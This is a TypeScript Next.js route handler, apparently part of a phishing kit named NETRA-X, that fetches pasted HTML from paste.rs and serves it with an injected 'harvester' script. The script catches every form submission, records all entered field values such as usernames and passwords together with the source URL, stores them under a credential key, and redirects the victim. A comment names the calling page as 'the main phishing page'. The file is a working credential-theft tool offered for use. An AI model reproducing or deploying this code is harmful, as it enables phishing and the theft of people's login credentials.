
import { NextRequest, NextResponse } from 'next/server';

export const revalidate = 0; // Don't cache this response

const getHarvesterScript = (redirectUrl: string) => `
<script>
  function captureAndRedirect(form) {
    try {
      const formData = new FormData(form);
      const credentials = {};
      let capturedData = false;

      for (let [key, value] of formData.entries()) {
        if (typeof value === 'string' && value.length > 0) {
          credentials[key] = value;
          capturedData = true;
        }
      }

      if (capturedData) {
        const entry = {
          ...credentials,
          source: window.location.href,
          timestamp: new Date().toISOString()
        };
        const storageKey = 'netra-captured-credentials';
        try {
          const existingData = JSON.parse(localStorage.getItem(storageKey) || '[]');
          const updatedData = [...existingData, entry];
          localStorage.setItem(storageKey, JSON.stringify(updatedData));

          window.dispatchEvent(new StorageEvent('storage', {
            key: storageKey,
            newValue: JSON.stringify(updatedData)
          }));
        } catch(e) {
          console.error('NETRA-X Harvester: Could not save to localStorage.', e);
        }
      }
    } catch (e) {
      console.error('NETRA-X Harvester: Error capturing form data.', e);
    } finally {
      setTimeout(() => {
        window.location.href = '${redirectUrl}';
      }, 150);
    }
  }

  document.addEventListener('submit', function(e) {
    if (e.target && e.target.tagName === 'FORM') {
      e.preventDefault();
      e.stopPropagation();
      captureAndRedirect(e.target);
    }
  }, true);
</script>
`;

export async function GET(req: NextRequest, { params }: { params: { id: string } }) {
    const id = params.id;
    if (!id) {
        return new NextResponse('Missing page ID.', { status: 400 });
    }

    try {
        // Fetch the raw HTML content from paste.rs on the server-side.
        const pasteRsResponse = await fetch(`https://paste.rs/${id}`);
        if (!pasteRsResponse.ok) {
            return new NextResponse(`Failed to fetch content from paste.rs. It may have expired.`, { status: 404 });
        }
        let originalHtml = await pasteRsResponse.text();

        // The redirect URL is now passed as a query parameter from the main phishing page.
        const redirectUrl = req.nextUrl.searchParams.get('redirectUrl') || '/';

        // Inject the harvester script.
        const harvesterScript = getHarvesterScript(redirectUrl);
        if (originalHtml.includes('</body>')) {
            originalHtml = originalHtml.replace(/<\/body>/i, `${harvesterScript}</body>`);
        } else {
            originalHtml += harvesterScript;
        }

        return new NextResponse(originalHtml, {
            status: 200,
            headers: { 
                'Content-Type': 'text/html; charset=utf-8',
                'Cache-Control': 'no-store, no-cache, must-revalidate, proxy-revalidate',
                'Pragma': 'no-cache',
                'Expires': '0',
            },
        });

    } catch (error) {
        console.error('Server-side fetch failed:', error);
        return new NextResponse('An internal error occurred while trying to load the page.', { status: 500 });
    }
}
